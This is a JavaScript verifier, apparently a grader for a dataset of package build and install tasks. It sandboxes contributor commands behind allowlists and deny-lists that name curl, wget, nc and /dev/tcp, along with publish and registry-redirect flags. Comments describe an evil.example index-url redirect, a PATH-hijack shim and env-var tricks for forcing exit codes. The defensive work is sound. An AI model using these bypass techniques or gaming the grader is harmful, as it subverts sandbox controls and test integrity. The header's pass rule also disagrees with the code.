/**
 * exit-code-verify — build a real package from package_source_files (a
 * single "path containing:\ncontent" fragment) plus a manifest reconstructed
 * from package_manifest's prose ("pyproject.toml declaring package name
 * 'X', version 'Y'[, using BACKEND]"), then run build_and_publish_commands
 * followed by install_test_script for real. expected_result states success
 * or failure in its first word; a row passes when the real outcome matches.
 *
 * One row embeds a LITERAL (deliberately malformed) manifest instead of
 * describing one in prose ("package.json with bad JSON missing closing
 * brace: {...}") — detected by an embedded `{`/`[` and used verbatim rather
 * than reconstructed, since reconstructing it would silently fix the very
 * defect the row exists to test.
 */
'use strict';

const MANIFEST_FILE = { pip: 'pyproject.toml', npm: 'package.json', cargo: 'Cargo.toml' };
const REQUIRED_BIN = { pip: 'pip3', npm: 'npm', cargo: 'cargo' };

const ALLOWED_BINARIES = {
  // twine deliberately excluded: its ONLY purpose is uploading to a package
  // index, which is exactly the "real publish" action this category must
  // never actually perform (see PUBLISH_DENYLIST_PATTERN below) -- unlike
  // pip/python, which are also needed for the legitimate build+install+test
  // steps, twine has no other use this contract could ever need.
  pip: new Set(['pip', 'pip3', 'python', 'python3', 'build']),
  npm: new Set(['npm', 'npx', 'node']),
  cargo: new Set(['cargo']),
};
// 'export'/'set' deliberately excluded: both mutate the shell's environment
// for every command that runs afterward in the same `bash -c` invocation,
// which is exactly the mechanism the env-var-injection bug below abused.
const BENIGN_SHELL_BINARIES = new Set([
  'cd', 'echo', 'mkdir', 'ls', 'cat', 'mv', 'cp', 'rm', 'true', 'false', 'test',
  'chmod', 'pwd', 'touch', 'printf', ':',
]);
// Defense in depth on top of the allowlist below: these have no legitimate
// reason to appear in a package build/install command.
const DENYLIST_PATTERN = /\b(curl|wget|nc|ncat|netcat|telnet|ssh|scp|rsync)\b|\/dev\/tcp|\bbase64\s+-d\b/i;
// The binary-level allowlist above only checks the LEADING token of each
// simple command -- it happily allows "npm publish", "cargo publish", or
// "pip install --index-url https://evil.example/simple pkg", since npm/
// cargo/pip are themselves legitimate, allowed binaries and nothing
// previously inspected their SUBCOMMAND or flags. This file's own opening
// comment says build_and_publish_commands/install_test_script run "for
// real" -- confirmed exploitable: every one of npm publish, twine upload,
// cargo publish, and a custom --registry/--index-url flag passed
// validateCommandShape with no rejection at all. The only thing stopping an
// actual publish to a real, public registry today is the sandbox
// ACCIDENTALLY lacking publish credentials -- not a deliberate block. None
// of the real reference dataset's 25 rows use any of these (confirmed by
// inspection), so this has no false-reject risk against genuine rows.
const PUBLISH_DENYLIST_PATTERN = /\b(npm|npx)\s+(publish|unpublish|login|adduser|token|owner|deprecate|access|whoami)\b|\bcargo\s+(publish|login|owner|yank)\b|\btwine\b|\bupload\b|--registry\b|--index-url\b|--extra-index-url\b|--repository(-url)?\b/i;

/**
 * Split on shell control operators (&&, ||, |, ;, newline) OUTSIDE of any
 * quoted string. install_test_script's whole point is a one-liner like
 * `node -e "const x = f(); if (!x) throw new Error('fail');"` — a bare
 * `cmd.split(/[;\n]/)` has no notion of quoting at all, so it chops the
 * SEMICOLONS INSIDE THE QUOTED -e ARGUMENT (ordinary JS/Python statement
 * separators, not shell separators) into bogus extra "simple commands".
 * Confirmed exploitable in the wrong direction — a FALSE REJECT, not a false
 * accept: this shattered every real dataset row using this ordinary,
 * near-universal one-liner shape (18 of 25 rows) into fragments like
 * `if(!isPalindrome('A` that don't start with a recognized binary at all,
 * rejecting genuinely correct submissions outright before anything ever ran.
 */
/**
 * True if `cmd` contains a shell I/O redirection operator (<, >, >>) OUTSIDE
 * any quoted string -- unlike build_dependency_resolution's build_command
 * (simple "npm install"-style invocations), install_test_script routinely
 * contains a real one-liner like `node -e "if (x > 5) throw new Error(...)"`,
 * where `>` is a genuine comparison operator inside the quoted -e argument,
 * not shell redirection at all. A blind whole-string `/[<>]/` test would
 * reject that ordinary, correct shape outright -- quote-awareness (the same
 * approach splitTopLevelShellCommands already uses for control operators)
 * is required to tell the two apart.
 */
function hasUnquotedRedirect(cmd) {
  const s = String(cmd == null ? '' : cmd);
  let quote = null;
  for (let i = 0; i < s.length; i++) {
    const ch = s[i];
    if (quote) {
      if (ch === quote && s[i - 1] !== '\\') quote = null;
      continue;
    }
    if (ch === "'" || ch === '"') { quote = ch; continue; }
    if (ch === '<' || ch === '>') return true;
  }
  return false;
}

function splitTopLevelShellCommands(cmd) {
  const s = String(cmd == null ? '' : cmd);
  const parts = [];
  let cur = '';
  let quote = null;
  for (let i = 0; i < s.length; i++) {
    const ch = s[i];
    if (quote) {
      cur += ch;
      if (ch === quote && s[i - 1] !== '\\') quote = null;
      continue;
    }
    if (ch === "'" || ch === '"') { quote = ch; cur += ch; continue; }
    if (ch === '&' && s[i + 1] === '&') { parts.push(cur); cur = ''; i++; continue; }
    if (ch === '|' && s[i + 1] === '|') { parts.push(cur); cur = ''; i++; continue; }
    if (ch === '|') { parts.push(cur); cur = ''; continue; }
    if (ch === ';' || ch === '\n') { parts.push(cur); cur = ''; continue; }
    cur += ch;
  }
  parts.push(cur);
  return parts.map((p) => p.trim()).filter(Boolean);
}

/**
 * Reject anything outside "build/install this package". The network access
 * this category is granted exists for package-registry traffic, not for
 * arbitrary contributor shell — build_and_publish_commands/install_test_script
 * are free text that used to run through `bash -c` completely unvalidated.
 * Splits on shell control operators and requires every simple command's
 * leading binary to be a known pip/npm/cargo tool or an inert shell builtin.
 */
function validateCommandShape(cmd, eco) {
  if (DENYLIST_PATTERN.test(cmd)) return 'contains a disallowed binary/pattern (network fetch, remote shell, etc.)';
  if (PUBLISH_DENYLIST_PATTERN.test(cmd)) return 'contains a real-publish action or registry-redirection flag, which this category must never actually perform';
  if (/\|\s*(ba)?sh\b/i.test(cmd)) return 'pipes output into a shell interpreter';
  // No legitimate build/install/test command for this category needs to
  // redirect input/output to an arbitrary path -- and this is also the
  // mechanism a PATH-hijack shim attack needs to WRITE its fake npm/pip/
  // cargo binary in the first place (e.g. `printf 'exit 0' > /tmp/x/npm`),
  // regardless of which nominally-benign binary is used to do the writing.
  // A substituted binary could ALSO perform the real publish action this
  // category must never perform, entirely bypassing PUBLISH_DENYLIST_PATTERN
  // (a purely textual check against the command string, blind to what a
  // hijacked binary actually does once invoked).
  if (hasUnquotedRedirect(cmd)) return 'contains an I/O redirection operator (<, >, >>) outside a quoted string';
  const simpleCommands = splitTopLevelShellCommands(cmd);
  const allowed = ALLOWED_BINARIES[eco] || new Set();
  for (const sc of simpleCommands) {
    // A leading `VAR=value` environment-assignment prefix used to be
    // silently STRIPPED before the allowlist check ran below, discarding it
    // rather than validating it -- confirmed exploitable the same way as
    // build_dependency_resolution's identical bug: real package managers
    // genuinely honor these overrides (NPM_CONFIG_REGISTRY, PIP_INDEX_URL,
    // CARGO_NET_OFFLINE, ...), so the stripped-and-ignored prefix let a
    // contributor force the real exit code of the build/install/test step
    // independent of whether the package genuinely works. Rejected outright
    // instead -- there is no legitimate reason for this category's commands
    // to set an environment variable inline.
    if (/^[A-Za-z_][A-Za-z0-9_]*=\S*(\s|$)/.test(sc)) {
      return 'command "' + sc.trim() + '" sets an environment variable inline -- not permitted';
    }
    const bin = sc.split(/\s+/)[0];
    if (!bin) continue;
    if (!allowed.has(bin) && !BENIGN_SHELL_BINARIES.has(bin)) {
      return 'command "' + sc.trim() + '" invokes "' + bin + '", which is not a recognized ' + eco + ' build tool';
    }
  }
  return null;
}

function parseSourceFile(text) {
  const m = text.match(/^([^\n]+?)\s+containing:\n([\s\S]*)$/);
  return m ? { path: m[1].trim(), content: m[2] } : null;
}

function detectEco(manifestText) {
  if (/pyproject\.toml/i.test(manifestText)) return 'pip';
  if (/package\.json/i.test(manifestText)) return 'npm';
  if (/Cargo\.toml/i.test(manifestText)) return 'cargo';
  return null;
}

function buildManifest(eco, manifestText, fallbackName, srcFilePath) {
  const literal = manifestText.match(/:\s*([{[][\s\S]*)$/);
  if (literal) return literal[1];

  const nameM = manifestText.match(/name\s+'([^']+)'/);
  const versionM = manifestText.match(/version\s+'([^']+)'/);
  const name = nameM ? nameM[1] : fallbackName;
  const version = versionM ? versionM[1] : '0.1.0';

  if (eco === 'npm') {
    // main defaults to the actual source file (which may be index.mjs, not
    // always index.js) rather than a hardcoded name; `type` is only set
    // when the prose actually declares one ("type 'module'") — an ESM
    // source file needs "type": "module" in package.json or Node treats the
    // .mjs-named main as CommonJS-incompatible export syntax and fails.
    const typeM = manifestText.match(/type\s+'([^']+)'/);
    const mainM = manifestText.match(/main\s+'([^']+)'/);
    const pkg = { name, version, main: mainM ? mainM[1] : srcFilePath };
    if (typeM) pkg.type = typeM[1];
    return JSON.stringify(pkg, null, 2);
  }
  if (eco === 'cargo') return ['[package]', 'name = "' + name + '"', 'version = "' + version + '"', 'edition = "2021"'].join('\n');

  const backendM = manifestText.match(/using\s+(\w+)/i);
  const backend = backendM ? backendM[1] : 'setuptools';
  if (backend === 'flit_core') {
    return [
      '[build-system]', 'requires = ["flit_core>=3.4"]', 'build-backend = "flit_core.buildapi"', '',
      '[project]', 'name = "' + name + '"', 'version = "' + version + '"', 'description = "test package"',
    ].join('\n');
  }
  return [
    '[build-system]', 'requires = ["setuptools>=61.0"]', 'build-backend = "setuptools.build_meta"', '',
    '[project]', 'name = "' + name + '"', 'version = "' + version + '"',
  ].join('\n');
}

module.exports = {
  contract: 'exit-code-verify',
  requires: [],

  verify(row, h) {
    const sourceText = h.str(row, 'package_source_files');
    const manifestText = h.str(row, 'package_manifest');
    const buildCmd = h.str(row, 'build_and_publish_commands');
    const testScript = h.str(row, 'install_test_script');
    const expectedResult = h.str(row, 'expected_result');
    if (!sourceText || !manifestText || !buildCmd || !testScript) {
      return { passed: false, detail: { reason: 'missing required fields' } };
    }

    const src = parseSourceFile(sourceText);
    if (!src) return { passed: false, detail: { reason: 'could not parse a "path containing:" fragment from package_source_files' } };

    const eco = detectEco(manifestText);
    if (!eco) return { passed: false, runtimeUnavailable: true, logs: 'could not determine ecosystem from package_manifest', detail: {} };
    const bin = REQUIRED_BIN[eco];
    if (!h.have(bin)) return { passed: false, runtimeUnavailable: true, logs: bin + ' not available', detail: { eco } };

    const buildShapeErr = validateCommandShape(buildCmd, eco);
    if (buildShapeErr) {
      return { passed: false, logs: 'build_and_publish_commands rejected: ' + buildShapeErr, detail: { eco, rejectedField: 'build_and_publish_commands' } };
    }
    const testShapeErr = validateCommandShape(testScript, eco);
    if (testShapeErr) {
      return { passed: false, logs: 'install_test_script rejected: ' + testShapeErr, detail: { eco, rejectedField: 'install_test_script' } };
    }

    const d = h.workdir();
    const srcPath = h.path.join(d, src.path);
    h.fs.mkdirSync(h.path.dirname(srcPath), { recursive: true });
    h.fs.writeFileSync(srcPath, src.content);

    const fallbackName = src.path.split('/')[0].replace(/\.\w+$/, '');
    h.fs.writeFileSync(h.path.join(d, MANIFEST_FILE[eco]), buildManifest(eco, manifestText, fallbackName, src.path));

    // Every OTHER category in this registry invokes 'python3' exclusively
    // (h.runCode/h.runWithTests never call bare 'python') -- this is the
    // only harness whose contributor-authored commands routinely use bare
    // 'python' instead (about half the real reference rows' install_test_script
    // do, e.g. `python -c "import ..."`). If the sandbox image follows this
    // registry's own established convention and only provides 'python3' on
    // PATH, every such row would fail with a genuine "command not found",
    // misreported as a contributor bug instead of an environment gap. Shim
    // it in (only when genuinely absent, so an image that already provides
    // its own 'python' -- pointing at python2 or otherwise -- is untouched).
    let runEnv;
    if (eco === 'pip' && !h.have('python')) {
      const shimDir = h.path.join(d, '_pyshim');
      h.fs.mkdirSync(shimDir, { recursive: true });
      const shimPath = h.path.join(shimDir, 'python');
      h.fs.writeFileSync(shimPath, '#!/usr/bin/env bash\nexec python3 "$@"\n');
      h.fs.chmodSync(shimPath, 0o755);
      runEnv = { PATH: shimDir + ':' + (process.env.PATH || '') };
    }

    // buildR + testR run SEQUENTIALLY inside the one outer sandbox command, so
    // their worst-case SUM, not either one alone, is what has to stay
    // strictly below the outer per-command budget (EXECUTION_RUNNER_TIMEOUT_MS,
    // 120s) -- same rule the config.ts boot invariant enforces for helpers.js's
    // own childTimeoutMs/probeTimeoutMs. The prior 90000+30000 summed to
    // EXACTLY 120000, leaving zero margin: the outer e2b command timeout's
    // clock starts before this verify() call even begins (sandbox prologue +
    // node startup + file writes), so for a build+test pair that genuinely
    // runs close to the combined ceiling, the outer timeout always fires
    // first and tears the whole command down with an ambiguous provider-level
    // timeout/error instead of a clean runtimeUnavailable-equivalent verdict
    // (this contract has no runtimeUnavailable path, but a failed exit still
    // beats no verdict at all). 75s/25s (sum 100s, 20s margin) stays well
    // above the documented worst cases (~28s for a slow pip build backend
    // invocation, ~13s for npm pack+install) while restoring real headroom.
    const buildR = h.run('bash', ['-c', buildCmd], { cwd: d, timeoutMs: 75000, env: runEnv });
    let succeeded = buildR.status === 0;
    let testR = null;
    if (succeeded) {
      testR = h.run('bash', ['-c', testScript], { cwd: d, timeoutMs: 25000, env: runEnv });
      succeeded = testR.status === 0;
    }

    // Unlike build_dependency_resolution's "does the description accurately
    // predict a real failure" framing, this category is about whether the
    // published package genuinely works — a row whose own expected_result
    // narrates a real, accurately-predicted failure ("ImportError occurs
    // because subtract is not exported") is still not a working package,
    // and is one of this dataset's negative rows (_expected_valid: false)
    // for exactly that reason. Success/failure of the real build+test run
    // IS the verdict; expected_result's wording is descriptive narrative,
    // not something to compare against.
    const passed = succeeded;
    const failingStep = testR || buildR;
    return {
      passed,
      logs: passed ? '' : ('build/install/test did not succeed:\n' + String(failingStep.stderr || failingStep.stdout).slice(0, 800)),
      detail: { eco, expectedResult: expectedResult.slice(0, 150), succeeded, buildExit: buildR.status, testExit: testR ? testR.status : null },
    };
  },
};
